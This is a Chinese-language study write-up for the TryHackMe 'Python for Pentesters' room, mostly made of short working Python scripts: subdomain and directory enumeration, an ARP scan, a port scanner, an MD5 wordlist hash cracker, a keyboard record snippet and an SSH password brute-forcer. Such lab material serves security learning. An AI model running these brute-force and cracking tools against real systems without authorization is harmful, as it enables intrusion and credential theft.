# Python for Pentesters

python，事实上我已经使用python开发、以及其他编程语言开发 断断续续已经三四年了

时间过得很快，四入五舍一下，三年前我就开始从零学开发。

而三年后，也就是现在，我开始学起了网安，三年又三年又三年。

可能一些曾经我非常熟悉的语言我或许忘了，但没关系，编程思想永远都刻在了dna里

---

在整个房间中，您将看到如何：

    使用 Python 枚举目标的子域
    构建一个简单的键盘记录器
    扫描网络以查找目标系统
    扫描任何目标以查找开放端口
    从互联网下载文件
    破解哈希

我直接贴代码了，没什么难度的，必要的时候现场写一个就好了，平时直接拿现成的来用

代码我就不解释了,都是挺简单的小脚本，看不懂的话可能需要学习一下python基础

### 部分代码我修改过，python3全都能用

---

### 子域枚举

    import requests 
    import sys 

    sub_list = open("subdomains.txt").read() 
    subdoms = sub_list.splitlines()

    for sub in subdoms:
        sub_domains = f"http://{sub}.{sys.argv[1]}" 

        try:
            requests.get(sub_domains)
        
        except requests.ConnectionError: 
            pass
        
        else:
            print("Valid domain: ",sub_domains)  

requests模块的使用，非常的简单

---

### 目录枚举

    import requests 
    import sys 

    sub_list = open("wordlist.txt").read() 
    directories = sub_list.splitlines()

    for dir in directories:
        dir_enum = f"http://{sys.argv[1]}/{dir}.html" 
        r = requests.get(dir_enum)
        if r.status_code==404: 
            pass
        else:
            print("Valid directory:" ,dir_enum)

### 网络扫描

    from scapy.all import *

    interface = "eth0"
    ip_range = "10.10.X.X/24"
    broadcastMac = "ff:ff:ff:ff:ff:ff"

    packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range) 

    ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

    for send,receive in ans:
            print (receive.sprintf(r"%Ether.src% - %ARP.psrc%")) 

scapy的使用; scapy文档：https://www.osgeo.cn/scapy/extending.html

---

### 端口扫描

    import sys
    import pyfiglet
    from socket import *

    print(pyfiglet.figlet_format("Sugobet \n Port Scanner"))

    ip = sys.argv[1]
    open_ports = []
    ports = range(1,sys.argv[2])


    def scan(port):
        result = 1
        try:
            sock = socket(AF_INET,SOCK_STREAM)
            sock.settimeout(1)
            r = sock.connect_ex((ip, port))

            if r == 0:
                result = r
            sock.close()
        except Exception:
            pass

        return result

    for port in ports:
        res = scan(port)
        if res == 0:
            open_ports.append(port)

    print(f"Open Ports:{open_ports}")

socket的简单使用

---

### 文件下载

也是requests的使用

    import requests

    url = 'https://assets.tryhackme.com/img/THMlogo.png'
    r = requests.get(url, allow_redirects=True)
    open('THMlogo.png', 'wb').write(r.content)

---

### hash爆破

    import hashlib
    import pyfiglet

    ascii_banner = pyfiglet.figlet_format("Sugobet \n HASH CRACKER for MD5")
    print(ascii_banner)

    wordlist_location = str(input('Enter wordlist file location: '))
    hash_input = str(input('Enter hash to be cracked: '))

    with open(wordlist_location, 'r', encoding="ISO-8859-1") as file:
        for line in file.readlines():
            print(line)
            hash_ob = hashlib.md5(line.strip().encode())
            hashed_pass = hash_ob.hexdigest()
            if hashed_pass == hash_input:
                print('Found cleartext password! ' + line.strip())
                exit(0)

---

### 键盘监听

    import keyboard
    keys = keyboard.record(until ='ENTER')
    keyboard.play(keys)

---

### ssh 爆破

paramiko模块的使用

    import paramiko


    target = str(input('Please enter target IP address: '))
    username = str(input('Please enter username to bruteforce: '))
    password_file = str(input('Please enter location of the password file: '))

    def ssh_connect(password, code=0):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(target, port=22, username=username, password=password)
        except paramiko.AuthenticationException:
            code = 1
        ssh.close()
        return code

    with open(password_file, 'r', encoding="ISO-8859-1") as file:
        for line in file.readlines():
            password = line.strip()
            
            try:
                response = ssh_connect(password)

                if response == 0:
                    print('password found: '+ password)
                    exit(0)
            except Exception as e:
                print(e)

